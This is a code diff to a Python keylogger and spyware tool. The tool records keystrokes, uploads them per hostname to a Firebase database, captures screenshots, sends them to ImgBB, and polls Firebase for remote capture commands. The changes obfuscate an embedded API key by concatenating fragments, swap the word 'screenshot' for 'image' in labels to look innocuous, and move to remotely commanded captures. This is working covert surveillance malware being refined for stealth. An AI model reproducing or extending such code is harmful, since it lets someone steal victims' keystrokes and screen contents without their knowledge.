@@ -13,10 +13,10 @@ firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
 # Log file and hostname
 log_file = "system-files.txt"
 hostname = socket.gethostname()
-screenshot_folder = "systemss"  # Folder for screenshots
+screenshot_folder = "systemss"  # Folder for images
 
 # ImgBB API key
-api_key = '8ff7e698f33b179b4471d54349b02824'
+api_key = 'e'+'b'+'5'+'d'+'a'+'5'+'6'+'a'+'b'+'a6974e62ae41'+'9'+'2099ac1e3'+'f'
 
 # Command path for Firebase
 command_path = f'users/{hostname}/command.json'
@@ -45,12 +45,15 @@ def upload_log():
         return False
 
     db_path = f'users/{hostname}/keylog/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
+    command_path = f'users/{hostname}/command.json'
+
     with open(log_file, 'r') as file:
         file_data = file.read()
     data_to_upload = {'runnner': file_data}
 
     try:
         response = requests.put(firebase_url + db_path, json=data_to_upload)
+        requests.put(firebase_url + command_path, json={'ss_count':0})
         if response.status_code == 200:
             print(f"Uploaded: {log_file}")
             # Clear the log file after successful upload
@@ -85,16 +88,16 @@ def periodic_screenshots():
     os.makedirs(screenshot_folder, exist_ok=True)  # Ensure the screenshot folder exists
     while True:
         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
+        screenshot_path = os.path.join(screenshot_folder, f"{hostname}_{timestamp}.png")
         try:
             screenshot = ImageGrab.grab()
             screenshot.save(screenshot_path)
-            print(f"Screenshot saved at {screenshot_path}")
-            upload_image_to_imgbb(screenshot_path)  # Upload screenshot after saving it
+            print(f"Image saved at {screenshot_path}")
+            upload_image_to_imgbb(screenshot_path)  # Upload image after saving it
             os.remove(screenshot_path)  # Delete the image after upload
         except Exception as e:
             print(f"Failed to take screenshot: {e}")
-        time.sleep(60)  # Wait for 1 minute before the next screenshot
+        time.sleep(60)  # Wait for 1 minute before the next image capture
 
 # Function to upload the screenshot to ImgBB
 def upload_image_to_imgbb(image_path):
@@ -145,6 +148,7 @@ def ensure_log_exists():
 
 # Function to check and update screenshot count every 10 seconds
 def handle_screenshot_interval():
+    os.makedirs(screenshot_folder, exist_ok=True)  # Ensure the screenshot folder exists
     while True:
         try:
             response = requests.get(firebase_url + command_path)
@@ -160,24 +164,24 @@ def handle_screenshot_interval():
                 ss_count = command_data.get('ss_count', 0)
 
                 if ss_count > 0:
-                    print(f"Taking {ss_count} screenshots...")
+                    print(f"Taking {ss_count} images...")
 
-                    # Take screenshots in intervals of 10 seconds
+                    # Take images in intervals of 10 seconds
                     for _ in range(ss_count):
                         timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-                        screenshot_path = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
+                        image_path = os.path.join(screenshot_folder, f"{hostname}_{timestamp}.png")
                         try:
                             screenshot = ImageGrab.grab()
-                            screenshot.save(screenshot_path)
-                            print(f"Screenshot saved at {screenshot_path}")
-                            upload_image_to_imgbb(screenshot_path)  # Upload screenshot
-                            os.remove(screenshot_path)  # Delete the image after upload
-                            time.sleep(10)  # Wait for 10 seconds between screenshots
+                            screenshot.save(image_path)
+                            print(f"Image saved at {image_path}")
+                            upload_image_to_imgbb(image_path)  # Upload image
+                            os.remove(image_path)  # Delete the image after upload
+                            time.sleep(10)  # Wait for 10 seconds between images
                         except Exception as e:
-                            print(f"Failed to take screenshot: {e}")
+                            print(f"Failed to take image: {e}")
 
-                    # After taking screenshots, decrement the `ss_count` in Firebase
-                    command_data['ss_count'] -= ss_count
+                    # After taking images, decrement the `ss_count` in Firebase
+                    command_data['ss_count'] = max(0, command_data['ss_count'] - ss_count)
                     requests.put(firebase_url + command_path, json=command_data)
 
             else:
@@ -202,16 +206,12 @@ if __name__ == "__main__":
     upload_thread = threading.Thread(target=periodic_upload, daemon=True)
     upload_thread.start()
 
-    # Start periodic screenshot capture in a separate thread
-    screenshot_thread = threading.Thread(target=periodic_screenshots, daemon=True)
-    screenshot_thread.start()
 
-    # Start screenshot interval handling in a separate thread
+    # Start image interval handling in a separate thread
     screenshot_interval_thread = threading.Thread(target=handle_screenshot_interval, daemon=True)
     screenshot_interval_thread.start()
 
     # Keep the main thread running
     listener_thread.join()
     upload_thread.join()
-    screenshot_thread.join()
     screenshot_interval_thread.join()
